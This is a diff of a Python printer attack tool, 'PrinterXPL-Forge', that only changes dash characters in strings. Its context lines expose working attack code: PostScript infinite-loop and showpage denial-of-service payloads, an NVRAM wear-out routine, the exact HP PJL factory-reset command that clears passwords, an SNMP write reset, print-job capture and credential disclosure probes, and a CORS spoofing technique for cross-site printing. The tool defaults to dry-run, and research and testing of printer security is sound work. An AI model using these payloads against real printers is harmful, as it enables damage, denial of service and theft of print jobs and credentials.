@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PrinterXPL-Forge — Attack Orchestrator
+PrinterXPL-Forge  -  Attack Orchestrator
 =====================================
 Executes a full structured attack campaign against a printer target,
 covering every category from the Müller et al. (2017) attack matrix
@@ -140,7 +140,7 @@ UEL = b'\x1b%-12345X'
 def dos_ps_infinite_loop(host: str, port: int = 9100, dry: bool = True,
                          timeout: float = 5) -> AttackResult:
     """
-    PostScript infinite loop: `{} loop` — hangs the interpreter permanently.
+    PostScript infinite loop: `{} loop`  -  hangs the interpreter permanently.
 
     The printer stops responding to all jobs until power-cycled.
     Affects: HP, Lexmark, Dell, Kyocera, Ricoh, Xerox, OKI.
@@ -167,7 +167,7 @@ def dos_ps_infinite_loop(host: str, port: int = 9100, dry: bool = True,
 def dos_ps_showpage_redef(host: str, port: int = 9100, dry: bool = True,
                           timeout: float = 5) -> AttackResult:
     """
-    Redefine PostScript showpage to an infinite loop — persistent until reboot.
+    Redefine PostScript showpage to an infinite loop  -  persistent until reboot.
 
     Uses exitserver to make the change permanent across all subsequent jobs.
     """
@@ -242,7 +242,7 @@ def dos_pjl_nvram_damage(host: str, port: int = 9100, dry: bool = True,
             exploited=False,
             evidence='DRY-RUN: NVRAM damage NOT executed. Printer PJL port is reachable.',
             severity='critical',
-            note='@PJL DEFAULT COPIES=X × N — exhausts NVRAM write cycles. Lab only.',
+            note='@PJL DEFAULT COPIES=X × N  -  exhausts NVRAM write cycles. Lab only.',
         )
 
     payload_parts = [UEL, b'@PJL\r\n']
@@ -259,7 +259,7 @@ def dos_pjl_nvram_damage(host: str, port: int = 9100, dry: bool = True,
         exploited=True,
         evidence=f"Sent {iterations} NVRAM write cycles via @PJL DEFAULT",
         severity='critical',
-        note='NVRAM wear-out attack — accumulates over time',
+        note='NVRAM wear-out attack  -  accumulates over time',
     )
 
 
@@ -349,7 +349,7 @@ def bypass_pml_factory_reset(host: str, port: int = 9100, dry: bool = True,
             evidence="DRY-RUN: port reachable, reset NOT sent. HP model detected: "
                      + _re.sub(r'[^\x20-\x7e]', '', resp.decode('latin-1', 'replace'))[:40],
             severity='critical',
-            note='@PJL DMCMD ASCIIHEX="040006020501010301040106" — HP factory reset',
+            note='@PJL DMCMD ASCIIHEX="040006020501010301040106"  -  HP factory reset',
         )
 
     reset_cmd = UEL + b'@PJL DMCMD ASCIIHEX="040006020501010301040106"\r\n' + UEL
@@ -362,14 +362,14 @@ def bypass_pml_factory_reset(host: str, port: int = 9100, dry: bool = True,
         exploited=True,
         evidence='@PJL DMCMD ASCIIHEX factory reset command sent',
         severity='critical',
-        note='Clears all passwords — used by @PJL DMCMD on HP printers',
+        note='Clears all passwords  -  used by @PJL DMCMD on HP printers',
     )
 
 
 def bypass_ps_exitserver(host: str, port: int = 9100,
                           timeout: float = 8) -> AttackResult:
     """
-    PostScript exitserver bypass — gain persistent system-level access.
+    PostScript exitserver bypass  -  gain persistent system-level access.
 
     `serverdict begin 0 exitserver` escapes the userdict jail and allows
     permanent modification of the server dictionary. Most PS printers
@@ -422,7 +422,7 @@ def bypass_snmp_reset(host: str, timeout: float = 8) -> AttackResult:
                 supported=True, vulnerable=True, exploited=True,
                 evidence=f"SNMP SET {oid}={val} accepted (community=private)",
                 severity='critical',
-                note='SNMP write reset — clears all security settings',
+                note='SNMP write reset  -  clears all security settings',
             )
 
     return AttackResult(
@@ -494,7 +494,7 @@ def job_capture_start(host: str, port: int = 9100,
     print jobs in the printer's permanent dictionary. Jobs can later be
     fetched by the attacker.
 
-    This is advisory 1/6 from Müller et al. (2017) — affects ALL PostScript
+    This is advisory 1/6 from Müller et al. (2017)  -  affects ALL PostScript
     printers since 1985 as it uses legitimate PS language constructs.
     """
     capture_ps = (
@@ -623,7 +623,7 @@ def info_pjl_memory_access(host: str, port: int = 9100,
         exploited=has_mem,
         evidence=_re.sub(r'[^\x20-\x7e]', ' ', text)[:200],
         severity='medium',
-        note='PJL DMINFO + INFO MEMORY — may expose configuration and credentials',
+        note='PJL DMINFO + INFO MEMORY  -  may expose configuration and credentials',
     )
 
 
@@ -723,10 +723,10 @@ def info_ps_credential_disclosure(host: str, port: int = 9100,
 def info_cors_spoofing_probe(host: str, port: int = 9100,
                               timeout: float = 8) -> AttackResult:
     """
-    Test CORS spoofing capability — can the printer act as an HTTP server?
+    Test CORS spoofing capability  -  can the printer act as an HTTP server?
 
     Sends a PostScript job that outputs HTTP headers including
-    Access-Control-Allow-Origin: * — making the printer act as a web server
+    Access-Control-Allow-Origin: *  -  making the printer act as a web server
     that JavaScript (from evil.com) can read.
 
     This is the basis for web attacker (cross-site printing) attacks.
@@ -780,12 +780,12 @@ def run_campaign(
     Execute the full printer attack campaign.
 
     Runs all attack categories from the matrix, respecting dry_run safety.
-    With dry_run=True (default), no destructive actions are taken —
+    With dry_run=True (default), no destructive actions are taken  - 
     only capabilities are probed and vulnerabilities reported.
 
     Args:
-        dry_run:    Safe mode — probe capabilities without exploiting.
-        run_netmap: Also run full network mapping (slow — scans /24).
+        dry_run:    Safe mode  -  probe capabilities without exploiting.
+        run_netmap: Also run full network mapping (slow  -  scans /24).
     """
     langs = [l.upper() for l in (printer_langs or [])]
     ports = set(open_ports or [])
@@ -812,7 +812,7 @@ def run_campaign(
 
     if verbose:
         print(f"\n{'='*65}")
-        print(f"  ATTACK CAMPAIGN — {make} {model} @ {host}")
+        print(f"  ATTACK CAMPAIGN  -  {make} {model} @ {host}")
         print(f"  Mode: {'DRY-RUN (no destructive actions)' if dry_run else 'LIVE EXPLOIT'}")
         print(f"{'='*65}\n")
 
@@ -988,7 +988,7 @@ def _print_result(r: AttackResult, verbose: bool) -> None:
 def print_campaign_report(report: CampaignReport) -> None:
     """Pretty-print a full CampaignReport."""
     print(f"\n{'='*70}")
-    print(f"  CAMPAIGN REPORT — {report.host}")
+    print(f"  CAMPAIGN REPORT  -  {report.host}")
     print(f"{'='*70}")
     print(f"  Target  : {report.make} {report.model} {report.firmware}")
     print(f"  Summary : {report.summary()}")
